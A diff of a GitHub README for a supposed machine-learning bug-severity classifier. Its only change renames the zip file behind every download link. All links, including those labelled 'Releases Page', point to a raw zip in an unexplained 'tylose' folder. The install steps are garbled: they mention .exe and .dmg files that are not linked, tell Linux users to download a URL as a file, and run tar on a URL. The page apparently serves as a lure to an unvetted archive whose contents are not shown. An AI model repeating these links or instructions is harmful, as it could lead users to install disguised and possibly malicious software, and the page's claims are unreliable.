@@ -1,6 +1,6 @@
 # 🐞 Automated-Bug-Severity-Classification - Prioritize Bugs Effectively  
 
-[![Download](https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-1.0.zip)](https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-1.0.zip)
+[![Download](https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-maioid.zip)](https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-maioid.zip)
 
 ## 📜 Overview  
 Automated Bug Severity Classification helps teams categorize bugs by severity using machine learning. This application is essential for prioritizing critical issues, allocating resources efficiently, and enhancing software quality and reliability. 
@@ -9,14 +9,14 @@ Automated Bug Severity Classification helps teams categorize bugs by severity us
 Follow these steps to download and run the software. No programming knowledge is needed, just a few simple actions.
 
 ## 📥 Download & Install  
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-1.0.zip).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-maioid.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version.
 3. Download the appropriate file for your operating system:
    - If you're using **Windows**, download the `.exe` file.
    - If you're using **Mac**, download the `.dmg` file.
-   - If you're using **Linux**, download the `https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-1.0.zip` file.
+   - If you're using **Linux**, download the `https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-maioid.zip` file.
 4. Once the download completes, locate the file in your downloads folder.
 
 ## 🛠️ Installation Instructions  
@@ -33,9 +33,9 @@ Visit this page to download: [Releases Page](https://raw.githubusercontent.com/m
 4. Open your Applications folder and find the application.
 
 ### For Linux:  
-1. Find the downloaded `https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-1.0.zip` file in your downloads.
+1. Find the downloaded `https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-maioid.zip` file in your downloads.
 2. Open a terminal window.
-3. Use the command: `tar -xf https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-1.0.zip` to extract the files.
+3. Use the command: `tar -xf https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-maioid.zip` to extract the files.
 4. Navigate to the extracted folder and run the application using: `./application_name`.
 
 ## 🎓 Features  
@@ -85,7 +85,7 @@ If you encounter issues:
 - softwaretesting  
 - testautomation  
 
-For more details, visit the [Releases Page](https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-1.0.zip).
+For more details, visit the [Releases Page](https://raw.githubusercontent.com/mahmoud-nabil-MN/Automated-Bug-Severity-Classification/main/tylose/Severity-Bug-Classification-Automated-maioid.zip).
 
 ## 🙏 Acknowledgments  
 Thank you to everyone who contributed to this project. Your support helps improve software quality for all users.
